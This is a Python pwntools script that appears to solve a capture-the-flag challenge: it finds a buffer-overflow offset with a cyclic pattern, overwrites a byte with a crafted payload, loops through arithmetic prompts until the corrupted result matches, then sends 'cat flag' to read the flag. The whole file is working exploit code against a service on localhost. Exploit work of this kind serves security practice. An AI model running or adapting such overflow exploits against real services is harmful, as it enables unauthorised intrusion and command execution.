#!/usr/bin/env python3

from pwn import *
import string

HOST = 'localhost'
PORT = 50000
ECHO_LEN = 31

def read_result(io):
    line = io.recvline_contains(b'You entered')
    match = re.match(br'You entered (\d+), the right answer is (\d+)', line)
    return int(match[1]), int(match[2])

context(arch='amd64', os='linux')
io = remote(HOST, PORT, level='info')

alphabet = string.ascii_letters

io.recvline_contains(b'3) quit')
io.sendline(b'1')
io.sendline(cyclic(ECHO_LEN, n=1, alphabet=alphabet).encode())
io.sendline(b'2')
io.recvline_contains(b'What is')
io.sendline(b'0')
result, _ = read_result(io)
log.info('Result: %#x', result)
offset = cyclic_find(p32(result)[2], n=1, alphabet=alphabet)
if offset == -1:
    log.error('Failed to find offset')
    sys.exit(1)
else:
    log.info('Offset: %d', offset)

io.sendline(b'1')
payload = b'A'*offset + bytes([0x03])
io.sendline(payload)

while True:
    io.sendline(b'2')

    pattern = br'What is (\d+) \+ (\d+)\? '
    line = io.recvline_regex(pattern)
    match = re.search(pattern, line)

    q1, q2 = int(match[1]), int(match[2])
    log.info('Question: %d + %d', q1, q2)
    target = q1 + q2
    
    if (target >> 16) & 0xFF != 3:
        log.warning('We got unlucky, target is %#x', target)

    io.sendline(f'{target}'.encode())
    result, answer = read_result(io)
    log.info('Result: %#x, answer: %#x', result, answer)
    if result == answer:
        break

io.sendline('cat flag'.encode())
flag = io.recvline().decode().strip()

log.info('Flag: %s', flag)

